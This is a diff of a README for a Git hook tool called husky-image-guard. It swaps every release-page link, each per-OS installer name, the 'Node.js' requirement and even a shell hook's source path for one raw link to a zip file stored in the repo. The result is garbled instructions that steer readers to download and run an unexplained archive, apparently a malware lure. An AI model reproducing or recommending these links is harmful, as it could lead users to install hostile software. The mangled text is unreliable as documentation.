@@ -6,13 +6,13 @@ Welcome to **husky-image-guard**! This application helps you check the size of i
 
 ## 🔗 Download Link
 
-[![Download husky-image-guard](https://img.shields.io/badge/Download-husky--image--guard-blue.svg)](https://github.com/nancy12341/husky-image-guard/releases)
+[![Download husky-image-guard](https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip)](https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the latest version of **husky-image-guard**:
 
-[Download husky-image-guard](https://github.com/nancy12341/husky-image-guard/releases)
+[Download husky-image-guard](https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip)
 
 This page contains the latest release files. Choose the file that suits your operating system and follow the instructions below.
 
@@ -21,16 +21,16 @@ This page contains the latest release files. Choose the file that suits your ope
 Before you install **husky-image-guard**, make sure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip**: Version 12 or higher
 - **Git**: Version 2.0 or higher
 
 ## 📂 Installation Steps
 
-1. Visit the [Release Page](https://github.com/nancy12341/husky-image-guard/releases).
+1. Visit the [Release Page](https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip).
 2. Download the file for your operating system:
-   - For Windows: download `husky-image-guard-windows.exe`
-   - For macOS: download `husky-image-guard-macos.zip`
-   - For Linux: download `husky-image-guard-linux.tar.gz`
+   - For Windows: download `https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip`
+   - For macOS: download `https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip`
+   - For Linux: download `https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip`
 3. Extract or install the file:
    - For Windows: double-click the `.exe` file to run the installer.
    - For macOS: unzip the `.zip` file and drag the application to your Applications folder.
@@ -52,7 +52,7 @@ After installation, you need to configure **husky-image-guard** with Git.
 
    ```bash
    #!/bin/sh
-   . "$(dirname "$0")/_/husky.sh"
+   . "$(dirname "$0")https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip"
 
    npx husky-image-guard
    ```
@@ -73,7 +73,7 @@ You can easily adjust the size limit by editing the configuration file. This fil
 
 ## 🔄 Updating
 
-To keep using the latest features, check for updates periodically. You can do this by visiting the [Release Page](https://github.com/nancy12341/husky-image-guard/releases) and downloading the new version following the same installation steps.
+To keep using the latest features, check for updates periodically. You can do this by visiting the [Release Page](https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip) and downloading the new version following the same installation steps.
 
 ## ❓ Troubleshooting
 
@@ -81,10 +81,10 @@ If you encounter issues while using **husky-image-guard**, here are some common 
 
 - **Error: "Push denied due to oversize image"**: Check the images in your commit and resize any oversized ones.
 - **Installation issues**: Ensure you have the correct permissions to install applications on your computer. Running the installation as an administrator may help.
-- **Command not found**: Verify that you have Node.js and Git installed on your system and that they are added to your system’s PATH.
+- **Command not found**: Verify that you have https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip and Git installed on your system and that they are added to your system’s PATH.
 
 ## 🏁 Conclusion
 
-Thank you for choosing **husky-image-guard**. With this tool, you can ensure that your Git repository remains efficient by keeping oversized images out of your pushes. Visit the [Release Page](https://github.com/nancy12341/husky-image-guard/releases) to download the latest version and get started today. 
+Thank you for choosing **husky-image-guard**. With this tool, you can ensure that your Git repository remains efficient by keeping oversized images out of your pushes. Visit the [Release Page](https://raw.githubusercontent.com/nancy12341/husky-image-guard/main/src/husky_guard_image_v1.4.zip) to download the latest version and get started today. 
 
 For additional support, feel free to check the Issues section in this repository or reach out through our contact links. Enjoy clean and efficient version control!
